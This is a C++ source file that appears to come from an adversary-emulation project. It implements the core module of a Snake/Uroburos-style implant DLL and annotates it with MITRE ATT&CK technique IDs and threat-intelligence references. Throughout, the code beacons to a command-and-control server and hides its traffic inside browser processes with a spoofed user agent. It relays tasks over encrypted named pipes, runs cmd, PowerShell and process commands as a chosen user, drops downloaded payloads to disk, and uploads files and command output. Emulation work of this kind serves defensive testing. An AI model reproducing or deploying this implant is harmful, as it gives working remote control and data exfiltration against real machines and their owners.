/*
 * Handle core implant logic
 *
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 * [2] https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 */
#include <algorithm>
#include <cwctype>
#include <sstream>
#include "core.h"
#include "enc_handler.h"
#include "execute.h"
#include "comms_pipe.h"
#include "util.h"

namespace module_core {

LPCSTR kImplantIdBase = "2157108421";
const size_t kImplantIdBaseLen = 10;
std::wstring module_implant_id = util::ConvertStringToWstring(kImplantIdBase);

/*
 * ForwardCmdResults:
 *      About:
 *          Helper function that takes command results from the executor and sends them to the C2 server.
 *          C2 Communication is XOR encrypted using a hardcoded XOR key.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
void ForwardCmdResults(
    ApiWrapperInterface* api_wrapper,
    std::string instruction_id,
    std::vector<char> command_output
) {
    // Log output and send to C2 server
    std::string log_msg;
    log_msg = "Received cmd output for instruction " + instruction_id + ": ";
    logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, log_msg);
    if (DEBUG_MODE) {
        for (unsigned char c : command_output) std::cout << c;
        std::cout << std::endl;
    }
    if (command_output.size() > 0) {
        logging::LogData(
            api_wrapper, 
            LOG_PIPE_SERVER, 
            reinterpret_cast<const unsigned char*>(&(command_output[0])), 
            command_output.size()
        );
    }
    comms_http::UploadCommandOutput(
        api_wrapper,
        DEFAULT_C2_ADDRESS,
        DEFAULT_C2_PORT,
        command_output,
        util::ConvertStringToWstring(instruction_id)
    );
}

/*
 * SetImplantId:
 *      About:
 *          Establishes the implant ID by XORing the local machine's hostname with a hardcoded string.
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 */
void SetImplantId(ApiWrapperInterface* api_wrapper) {
    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    unsigned char c;
    std::ostringstream id_stream;
    if (api_wrapper->GetComputerNameWrapper(buffer, &size)) {
        std::string narrow_name = util::ConvertWstringToString(buffer);
        logging::LogMessage(
            api_wrapper,
            LOG_C2,
            LOG_LEVEL_INFO,
            "Discovered computer name: " + narrow_name + ". XORing with key " + std::string(kImplantIdBase)
        );

        // Use computer name as XOR key against implant ID base name
        LPCSTR narrow_name_cstr = narrow_name.c_str();
        for (size_t i = 0; i < kImplantIdBaseLen; i++) {
            c = (unsigned char)(narrow_name_cstr[i % size] ^ kImplantIdBase[i]);
            id_stream << std::hex << std::setw(2) << std::setfill('0') << (int)c;
        }

        module_implant_id = util::ConvertStringToWstring(id_stream.str());
        logging::LogMessage(
            api_wrapper,
            LOG_C2,
            LOG_LEVEL_INFO,
            "Set implant ID to " + util::ConvertWstringToString(module_implant_id)
        );
    } else {
        logging::LogMessage(
            api_wrapper,
            LOG_C2,
            LOG_LEVEL_ERROR,
            "Failed to get computer name (error code " + std::to_string(api_wrapper->GetLastErrorWrapper()) + "). Using default ID " + util::ConvertWstringToString(module_implant_id)
        );
    }
}

// Determine whether or not the DLL is running in a browser process. If in a browser process, 
// set the user agent accordingly. If not, set to execution mode.
DWORD GetModuleModeAndSetUserAgent(ApiWrapperInterface* api_wrapper, DWORD* module_mode) {
    wchar_t buffer[MAX_PATH];
    
    // Get current process filename
    if (api_wrapper->GetModuleFileNameWrapper(NULL, buffer, MAX_PATH) == 0) {
        return api_wrapper->GetLastErrorWrapper();
    }

    std::wstring path(buffer);
    std::wstring filename;
    if (path.find(L"\\") == std::wstring::npos) {
        filename = path;
    } else {
        filename = path.substr(path.find_last_of(L"\\") + 1);
    }

    // Convert to lowercase. Reference: https://stackoverflow.com/a/313990
    std::transform(
        filename.begin(), 
        filename.end(), 
        filename.begin(), 
        [](wchar_t c){ return towlower(c); }
    );

    // If we're running in a browser process, then we're in comms mode.
    if (filename.compare(L"chrome.exe") == 0) {
        *module_mode = COMMS_MODE;
        comms_http::UpdateUserAgent(CHROME_WIN10_USER_AGENT);
    } else if (filename.compare(L"firefox.exe") == 0 ){
        *module_mode = COMMS_MODE;
        comms_http::UpdateUserAgent(FIREFOX_WIN10_USER_AGENT);
    } else if (filename.compare(L"msedge.exe") == 0) {
        *module_mode = COMMS_MODE;
        comms_http::UpdateUserAgent(EDGE_WIN10_USER_AGENT);
    } else if (filename.compare(L"iexplore.exe") == 0) {
        *module_mode = COMMS_MODE;
        comms_http::UpdateUserAgent(IE_WIN10_USER_AGENT);
    } else {
        *module_mode = EXECUTION_MODE;
    }

    return ERROR_SUCCESS;
}

void HandleClientMessage(ApiWrapperInterface* api_wrapper, comms_pipe::PipeMessage* client_msg) {
    instruction::Instruction received_instruction = instruction::Instruction();
    DWORD result;
    std::string log_msg;
    std::string error_msg;
    HANDLE h_client_pipe;
    std::vector<char> v_payload_bytes;
    std::string payload_dest;
        
    // Handle client message
    if (client_msg->message_type == PIPE_MSG_BEACON) {
        result = comms_http::PerformBeacon(api_wrapper, DEFAULT_C2_ADDRESS, DEFAULT_C2_PORT, module_implant_id, &received_instruction);
        if (result == ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Successful beacon response");
            log_msg = "Instruction info:\n";
            log_msg += "\tID: " + util::ConvertWstringToString(received_instruction.instruction_id) + "\n";
            log_msg += "\tType: " + std::to_string(received_instruction.instruction_type) + "\n";
            log_msg += "\tSleep Time: " + std::to_string(received_instruction.sleep_time) + "\n";
            log_msg += "\tShell Command: " + util::ConvertWstringToString(received_instruction.shell_command) + "\n";
            log_msg += "\tRun as user: " + util::ConvertWstringToString(received_instruction.runas_user) + "\n";
            logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_DEBUG, log_msg);

            // Handle instruction from C2 server
            switch (received_instruction.instruction_type) {
                case TASK_EMPTY:
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received empty intruction. Will forward to executor client.");
                    break;
                case TASK_CMD_EXECUTE: 
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received cmd execute intruction. Will forward to executor client.");
                    break;
                case TASK_PROC_EXECUTE: 
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received proc execute intruction. Will forward to executor client.");
                    break;
                case TASK_PSH_EXECUTE:
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received psh execute intruction. Will forward to executor client.");
                    break;
                case TASK_FILE_DOWNLOAD:
                    log_msg = "Received instruction to download payload and forward to client: " + util::ConvertWstringToString(received_instruction.file_to_download);
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, log_msg);

                    // Download payload and send to pipe client
                    v_payload_bytes = comms_http::DownloadPayloadBytes(
                        api_wrapper, 
                        DEFAULT_C2_ADDRESS, 
                        DEFAULT_C2_PORT,
                        received_instruction.instruction_id,
                        &result
                    );
                    if (result != ERROR_SUCCESS) {
                        std::string error_msg = "Failed to download payload. Error code: " + std::to_string(result);
                        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, error_msg);
                        logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Sending error message to client.");
                        h_client_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_CLIENT);
                        result = comms_pipe::SendErrorResp(api_wrapper, h_client_pipe, log_msg);
                        api_wrapper->CloseHandleWrapper(h_client_pipe);
                        if (result != ERROR_SUCCESS) {
                            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to send error response to client. Error code: " + std::to_string(result));
                        }
                        return;
                    }

                    // Forward payload to pipe client
                    logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Forwarding payload to client.");
                    h_client_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_CLIENT);
                    payload_dest = util::ConvertWstringToString(received_instruction.download_dest_path);
                    result = comms_pipe::SendPayloadResp(
                        api_wrapper, 
                        h_client_pipe, 
                        payload_dest,
                        v_payload_bytes);
                    api_wrapper->CloseHandleWrapper(h_client_pipe);
                    if (result != ERROR_SUCCESS) {
                        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to send payload response to client. Error code: " + std::to_string(result));
                    }
                    return;
                case TASK_FILE_UPLOAD:
                    log_msg = "Received instruction to upload file " + util::ConvertWstringToString(received_instruction.file_to_upload);
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, log_msg);
                    result = comms_http::UploadFile(
                        api_wrapper, 
                        DEFAULT_C2_ADDRESS, 
                        DEFAULT_C2_PORT,
                        received_instruction.file_to_upload.c_str(),
                        received_instruction.instruction_id,
                        TRUE // encrypt uploads
                    );
                    break;
                case TASK_LOGS_UPLOAD:
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Received instruction to upload log files.");
                    comms_http::UploadLogs(
                        api_wrapper, 
                        DEFAULT_C2_ADDRESS, 
                        DEFAULT_C2_PORT
                    );
                    break;
                default:
                    // Unsupported instruction code. Log and send error response to pipe client.
                    log_msg = "Unsupported instruction code for comms mode: " + std::to_string(received_instruction.instruction_type);
                    logging::LogMessage(api_wrapper, LOG_C2, LOG_LEVEL_ERROR, log_msg);
                    logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Sending error message to client: " + log_msg);
                    h_client_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_CLIENT);
                    result = comms_pipe::SendErrorResp(api_wrapper, h_client_pipe, log_msg);
                    api_wrapper->CloseHandleWrapper(h_client_pipe);
                    if (result != ERROR_SUCCESS) {
                        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to send error response to client. Error code: " + std::to_string(result));
                    }
                    return;
            }

            // Forward instruction string to pipe client
            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Forwarding instruction to client: " + received_instruction.original_str);
            h_client_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_CLIENT);
            result = comms_pipe::SendCmdResp(api_wrapper, h_client_pipe, received_instruction.original_str);
            api_wrapper->CloseHandleWrapper(h_client_pipe);
            if (result != ERROR_SUCCESS) {
                logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to send beacon response to client. Error code: " + std::to_string(result));
            }
        } else {
            // Send error response to client
            error_msg = "Unsuccessful HTTP beacon.";
            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Sending error message to client: " + error_msg);
            h_client_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_CLIENT);
            result = comms_pipe::SendErrorResp(api_wrapper, h_client_pipe, error_msg);
            api_wrapper->CloseHandleWrapper(h_client_pipe);
            if (result != ERROR_SUCCESS) {
                logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to send error response to client. Error code: " + std::to_string(result));
            }
        }
    } else if (client_msg->message_type == PIPE_MSG_TASK_OUTPUT) {
        ForwardCmdResults(
            api_wrapper, 
            client_msg->instruction_id, 
            client_msg->data
        );
    } else {
        // Invalid message type. Notify client.
        error_msg = "Pipe server doesn't support message type: " + std::to_string(client_msg->message_type);
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, error_msg);
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Sending error message to client: " + error_msg);
        h_client_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_CLIENT);
        result = comms_pipe::SendErrorResp(api_wrapper, h_client_pipe, error_msg);
        api_wrapper->CloseHandleWrapper(h_client_pipe);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to send error response to client. Error code: " + std::to_string(result));
        }
    }
}

// Main routine for comms mode
DWORD MainCommsRoutine(ApiWrapperInterface* api_wrapper) {
    DWORD result;
    std::string log_msg;
    HANDLE h_server_pipe;

    // Set implant ID
    SetImplantId(api_wrapper);

    // Need successful heartbeat before we start setting up our server pipe
    do {
        result = comms_http::PerformHeartbeat(api_wrapper, DEFAULT_C2_ADDRESS, DEFAULT_C2_PORT);
        api_wrapper->SleepWrapper(DEFAULT_BEACON_SLEEP_MS);
    } while (result != ERROR_SUCCESS);

    // Create server-side pipe
    h_server_pipe = api_wrapper->CreateNamedPipeWrapper(
        PIPE_NAME_SERVER,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS, // don't accept remote conns
        1, // just one instance at a time
        PIPE_IN_BUFFER,
        PIPE_OUT_BUFFER,
        0,
        NULL
    );
    if (h_server_pipe == INVALID_HANDLE_VALUE) {
        result = api_wrapper->GetLastErrorWrapper();
        log_msg = "Failed to create server pipe " + util::ConvertWstringToString(PIPE_NAME_SERVER) + ". Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, log_msg);
        return result;
    } 
    logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_INFO, "Created server pipe " + util::ConvertWstringToString(PIPE_NAME_SERVER));
    
    // Comms loop. Pipe reference: https://stackoverflow.com/a/26561999
    while (true) {
        comms_pipe::PipeMessage client_msg = comms_pipe::PipeMessage();

        // Wait for client to connect to pipe
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Waiting for client connections.");
        if (!api_wrapper->ConnectNamedPipeWrapper(h_server_pipe, NULL)) {
            result = api_wrapper->GetLastErrorWrapper();
            if (result != ERROR_PIPE_CONNECTED) {
                logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to wait for client connection. Error code: " + std::to_string(result));
                api_wrapper->SleepWrapper(DEFAULT_BEACON_SLEEP_MS);
                continue;
            }
        }
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_INFO, "Received client connection.");

        // Read client message
        result = comms_pipe::GetPipeMsg(api_wrapper, h_server_pipe, &client_msg);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to read message from client. Error code: " + std::to_string(result));
            if (!api_wrapper->DisconnectNamedPipeWrapper(h_server_pipe)) {
                result = api_wrapper->GetLastErrorWrapper();
                logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
            }
            continue;
        }
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, "Received client message.");
        log_msg = "Client message info:\n";
        log_msg += "\tType: " + std::to_string(client_msg.message_type) + "\n";
        log_msg += "\tInstruction ID: " + client_msg.instruction_id + "\n";
        log_msg += "\tData length: " + std::to_string(client_msg.data.size()) + "\n";
        logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_DEBUG, log_msg);

        // Handle client message and disonnect server pipe for next iteration
        if (!api_wrapper->DisconnectNamedPipeWrapper(h_server_pipe)) {
            result = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
        }
        HandleClientMessage(api_wrapper, &client_msg);
    }
    api_wrapper->CloseHandleWrapper(h_server_pipe);
    logging::CloseMutexHandles(api_wrapper);
    return result;
}

void PipeClientHandleCmdResults(
    ApiWrapperInterface* api_wrapper, 
    std::string instruction_id,
    std::vector<char> command_output,
    DWORD execution_result
) {
    HANDLE h_server_pipe;
    DWORD result;
    if (execution_result != ERROR_SUCCESS) {
        logging::LogMessage(
            api_wrapper, 
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to execute task. Error code: " + std::to_string(execution_result)
        );
    } else {
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_DEBUG, "Received cmd output for instruction " + instruction_id + ": ");
        if (DEBUG_MODE) {
            for (unsigned char c : command_output) std::cout << c;
            std::cout << std::endl;
        }
        if (command_output.size() > 0) {
            logging::LogData(
                api_wrapper, 
                LOG_EXECUTION, 
                reinterpret_cast<const unsigned char*>(&(command_output[0])), 
                command_output.size()
            );
        }
        // Connect to server pipe and send output
        h_server_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_SERVER);
        result = comms_pipe::SendTaskOutput(api_wrapper, h_server_pipe, instruction_id, command_output);
        api_wrapper->CloseHandleWrapper(h_server_pipe);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(
                api_wrapper, 
                LOG_PIPE_CLIENT, 
                LOG_LEVEL_ERROR, 
                "Failed to send task output for instruction " + instruction_id + ". Error code: " + std::to_string(result)
            );
            api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
        } else {
            logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_DEBUG, "Sent command output to pipe server.");
        }
    }
}

/*
 * SavePayloadFromPipeMsg:
 *      About:
 *         Write payload bytes to disk that were provided by the comms usermodule DLL.
 *      MITRE ATT&CK Techniques:
 *          T1105: Ingress Tool Transfer
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
void SavePayloadFromPipeMsg(ApiWrapperInterface* api_wrapper, std::vector<char> msg_data) {
    // First 4 bytes contain payload dest
    size_t offset = 0;
    int32_t dest_len = *((int32_t*)(&msg_data[offset]));

    // Get payload dest
    offset += sizeof(int32_t);
    std::string payload_dest_narrow(msg_data.cbegin() + offset, msg_data.cbegin() + offset + dest_len);
    std::wstring payload_dest = util::ConvertStringToWstring(payload_dest_narrow);

    // Get payload bytes
    offset += dest_len;
    std::vector<unsigned char> payload_bytes(msg_data.begin() + offset, msg_data.end());

    // Save to disk
    DWORD result = ERROR_SUCCESS;
    HANDLE h_dest_file = INVALID_HANDLE_VALUE;
    std::string log_msg;

    // If no directory specified, use snake home directory. ".\filename" will use current directory.
    std::wstring dest_path = (payload_dest.find(L"\\") == std::wstring::npos) ? std::wstring(HOME_DIRECTORY) + L"\\" + payload_dest : payload_dest;
    
    // open file to save payload to
    h_dest_file = api_wrapper->CreateFileWrapper(
        dest_path.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS, // always create new file
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (h_dest_file == INVALID_HANDLE_VALUE) {
        result = api_wrapper->GetLastErrorWrapper();
        log_msg = "Failed to open payload destination file " + util::ConvertWstringToString(dest_path) + ". Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
        return;
    }
    
    // Write payload
    result = file_handler::WriteFileBytes(api_wrapper, h_dest_file, &payload_bytes[0], payload_bytes.size());
    if (result != ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, "Payload write failed. Error code: " + std::to_string(result));
    } else {
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_INFO, "Successfully wrote payload to " + util::ConvertWstringToString(dest_path));
    }

    // Close file handle
    if (h_dest_file != INVALID_HANDLE_VALUE) 
        api_wrapper->CloseHandleWrapper(h_dest_file);
    else 
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, "Invalid handle value - can't close ");
}

void PerformPipeClientInstruction(
    ApiWrapperInterface* api_wrapper,
    instruction::Instruction* received_instruction
) {
    std::vector<char> command_output;
    DWORD execution_result;

    // Perform instruction
    switch (received_instruction->instruction_type) {
        case TASK_EMPTY:
            break;
        case TASK_CMD_EXECUTE:
            // Get command output and send to C2 server
            command_output = execute::ExecuteCmdCommand(
                api_wrapper, 
                received_instruction->shell_command.c_str(),
                received_instruction->runas_user,
                DEFAULT_TIMEOUT_SECONDS,
                &execution_result
            );
            PipeClientHandleCmdResults(
                api_wrapper, 
                util::ConvertWstringToString(received_instruction->instruction_id), 
                command_output, 
                execution_result
            );
            break;
        case TASK_PSH_EXECUTE:
            // Get command output and send to C2 server
            command_output = execute::ExecutePshCommand(
                api_wrapper, 
                received_instruction->shell_command.c_str(),
                received_instruction->runas_user,
                DEFAULT_TIMEOUT_SECONDS,
                &execution_result
            );
            PipeClientHandleCmdResults(
                api_wrapper, 
                util::ConvertWstringToString(received_instruction->instruction_id), 
                command_output, 
                execution_result
            );
            break;
        case TASK_PROC_EXECUTE:
            // Get command output and send to C2 server
            command_output = execute::ExecuteProcCommand(
                api_wrapper, 
                received_instruction->process_binary_path.c_str(),
                received_instruction->process_args.c_str(),
                received_instruction->runas_user,
                DEFAULT_TIMEOUT_SECONDS,
                &execution_result
            );
            PipeClientHandleCmdResults(
                api_wrapper, 
                util::ConvertWstringToString(received_instruction->instruction_id), 
                command_output, 
                execution_result
            );
            break;
        default:
            logging::LogMessage(
                api_wrapper,
                LOG_PIPE_CLIENT, 
                LOG_LEVEL_ERROR, 
                "Unsupported instruction code: " + std::to_string(received_instruction->instruction_type)
            );
            break;
    }
}


// Main routine for execution mode
DWORD MainExecutionRoutine(ApiWrapperInterface* api_wrapper) {
    HANDLE h_server_pipe;
    HANDLE h_client_pipe;
    DWORD result;
    std::string resp_str;
    
    // Create client-side pipe
    h_client_pipe = comms_pipe::CreateClientPipe(api_wrapper, &result);
    if (h_client_pipe == INVALID_HANDLE_VALUE) {
        return result;
    }

    while(true) {
        // Connect to server pipe
        h_server_pipe = comms_pipe::ConnectToPipe(api_wrapper, PIPE_NAME_SERVER);
        
        // Send a beacon request to the pipe server
        result = comms_pipe::SendBeaconRequest(api_wrapper, h_server_pipe);
        api_wrapper->CloseHandleWrapper(h_server_pipe);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(
                api_wrapper, 
                LOG_PIPE_CLIENT, 
                LOG_LEVEL_ERROR, 
                "Failed to send beacon request. Error code: " + std::to_string(result)
            );
            api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
            continue;
        }
        logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_DEBUG, "Sent beacon request to pipe server.");
        
        // Wait for server to connect to pipe
        comms_pipe::PipeMessage response_msg = comms_pipe::PipeMessage();
        logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_DEBUG, "Waiting for connection from server.");
        if (!api_wrapper->ConnectNamedPipeWrapper(h_client_pipe, NULL)) {
            result = api_wrapper->GetLastErrorWrapper();
            if (result != ERROR_PIPE_CONNECTED) {
                logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_ERROR, "Failed to wait for connection. Error code: " + std::to_string(result));
                api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
                continue;
            }
        }
        logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_INFO, "Received connection from server.");

        // Read server response
        result = comms_pipe::GetPipeMsg(api_wrapper, h_client_pipe, &response_msg);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_ERROR, "Failed to read beacon response from server. Error code: " + std::to_string(result));
            if (!api_wrapper->DisconnectNamedPipeWrapper(h_client_pipe)) {
                result = api_wrapper->GetLastErrorWrapper();
                logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
            }
            api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
            continue;
        }
        if (!api_wrapper->DisconnectNamedPipeWrapper(h_client_pipe)) {
            result = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_PIPE_SERVER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
        }

        // Process server response
        resp_str = std::string(response_msg.data.begin(), response_msg.data.end());
        instruction::Instruction received_instruction = instruction::Instruction();
        switch (response_msg.message_type) {
            case PIPE_MSG_CMD_RESP:
                logging::LogMessage(
                    api_wrapper, 
                    LOG_PIPE_CLIENT, 
                    LOG_LEVEL_DEBUG, 
                    "Received beacon command response from pipe server: " +  resp_str
                );

                // Convert response data to instruction and perform it
                result = instruction::ExtractInstructionInformation(api_wrapper, resp_str, &received_instruction);
                if (result != ERROR_SUCCESS) {
                    logging::LogMessage(
                        api_wrapper, 
                        LOG_PIPE_CLIENT, 
                        LOG_LEVEL_ERROR, 
                        "Failed to extract instruction info from response. Error code: " + std::to_string(result)
                    );
                    api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
                } else {
                    PerformPipeClientInstruction(api_wrapper, &received_instruction);
                    api_wrapper->SleepWrapper(received_instruction.sleep_time * 1000);
                }
                break;
            case PIPE_MSG_PAYLOAD_RESP:
                logging::LogMessage(
                    api_wrapper, 
                    LOG_PIPE_CLIENT, 
                    LOG_LEVEL_DEBUG, 
                    "Received beacon payload response from pipe server."
                );

                // Convert message data into payload dest and payload bytes, and save to file
                SavePayloadFromPipeMsg(api_wrapper, response_msg.data);
                break;
            case PIPE_MSG_ERROR_RESP:
                logging::LogMessage(
                    api_wrapper, 
                    LOG_PIPE_CLIENT, 
                    LOG_LEVEL_ERROR, 
                    "Received error message from pipe server " + resp_str
                );
                api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
                break;
            default:
                logging::LogMessage(
                    api_wrapper, 
                    LOG_PIPE_CLIENT, 
                    LOG_LEVEL_ERROR, 
                    "Received unsupported message type " + std::to_string(response_msg.message_type)
                );
                api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
                break;
        }
    }
    api_wrapper->CloseHandleWrapper(h_client_pipe);
    logging::CloseMutexHandles(api_wrapper);
    return ERROR_SUCCESS;
}

// Core function for the DllMain thread to run
// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms686736(v=vs.85)
DWORD WINAPI CoreLoop(LPVOID lpParameter) {
    // silence warnings about unused parameters
    (void)lpParameter;
    ApiWrapper api_wrapper;
    DWORD module_mode;

    // Create encryption key
    comms_pipe::pipe_cast128_key = enc_handler::GenerateCast128Key(enc_handler::kDefaultPassword, enc_handler::kDefaultSalt);
    if (DEBUG_MODE) {
        std::cout << "Using CAST128 key: ";
        for (unsigned char c : comms_pipe::pipe_cast128_key)
            std::cout << "0x" << std::setw(2) << std::setfill('0') << std::hex << (int)(c) << ' ';
        std::cout << std::endl;
    }

    // Determine which mode we will run in
    DWORD result = GetModuleModeAndSetUserAgent(&api_wrapper, &module_mode);
    if (result != ERROR_SUCCESS) {
        logging::LogMessage(&api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to obtain module mode. Error code: " + std::to_string(result));
        return result;
    }
    if (module_mode == COMMS_MODE) {
        logging::LogMessage(&api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Running in comms mode. Set user agent string to: " + util::ConvertWstringToString(comms_http::user_agent));

        // Create mutexes as comms module
        result = logging::CreateExecutionLogMutex(&api_wrapper, FALSE);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(&api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to create execution log mutex. Error code: " + std::to_string(result));
            return FAIL_CREATE_EXECUTION_LOG_MUTEX;
        }
        result = logging::CreatePipeClientLogMutex(&api_wrapper, FALSE);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(&api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Failed to create pipe client log mutex. Error code: " + std::to_string(result));
            logging::CloseMutexHandles(&api_wrapper);
            return FAIL_CREATE_PIPE_CLIENT_LOG_MUTEX;
        }
        logging::LogMessage(&api_wrapper, LOG_C2, LOG_LEVEL_INFO, "Created mutexes.");
        return MainCommsRoutine(&api_wrapper);
    } else if (module_mode == EXECUTION_MODE) {
        // Create mutexes as execution module
        result = logging::CreateExecutionLogMutex(&api_wrapper, TRUE);
        if (result != ERROR_SUCCESS) {
            if (DEBUG_MODE) std::wcerr << L"[ERROR] Failed to create execution log mutex. Error code: " << result << std::endl;
            return FAIL_CREATE_EXECUTION_LOG_MUTEX;
        }
        result = logging::CreatePipeClientLogMutex(&api_wrapper, TRUE);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(&api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, "Failed to create pipe client log mutex. Error code: " + std::to_string(result));
            logging::CloseMutexHandles(&api_wrapper);
            return FAIL_CREATE_PIPE_CLIENT_LOG_MUTEX;
        }

        logging::LogMessage(&api_wrapper, LOG_EXECUTION, LOG_LEVEL_INFO, "Running in execution mode. Created mutexes.");
        return MainExecutionRoutine(&api_wrapper);
    } else {
        logging::LogMessage(&api_wrapper, LOG_C2, LOG_LEVEL_ERROR, "Invalid module mode: " + std::to_string(module_mode));
        return FAIL_INVALID_MODULE_MODE;
    }
}

} // namespace module_core

